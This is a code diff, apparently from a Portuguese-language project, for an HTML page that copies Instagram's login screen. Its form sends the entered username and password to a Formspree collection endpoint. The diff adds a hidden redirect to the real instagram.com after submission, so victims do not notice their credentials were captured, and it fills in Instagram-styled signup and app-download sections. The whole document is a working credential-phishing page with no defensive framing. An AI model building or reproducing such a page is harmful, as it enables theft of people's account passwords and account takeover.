@@ -18,7 +18,7 @@
                 <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">
 
                 <div class="user-login">
-                    <!-- FORMULÁRIO CONECTADO AO FORMSPREE -->
+                    <!-- FORMULÁRIO CONECTADO AO FORMSPREE COM REDIRECIONAMENTO -->
                     <form action="https://formspree.io/f/xkoojkow" method="POST">
                         <!-- Campo de login genérico -->
                         <input 
@@ -34,6 +34,9 @@
                             placeholder="Senha" 
                             required
                         >
+
+                        <!-- Redirecionamento após envio -->
+                        <input type="hidden" name="_next" value="https://www.instagram.com/">
 
                         <button type="submit" class="instagram-entrar">
                             Entrar
@@ -56,4 +59,18 @@
             <div class="group">
                 <p class="not-account">
                     Não tem uma conta?
-                    <span class="link-blue">
+                    <span class="link-blue">Cadastre-se</span>
+                </p>
+            </div>
+
+            <div class="get-app">
+                <p class="get-app">Obtenha o aplicativo</p>
+                <div class="download">
+                    <a href="#" class="app-download"></a>
+                    <a href="#" class="app-download"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
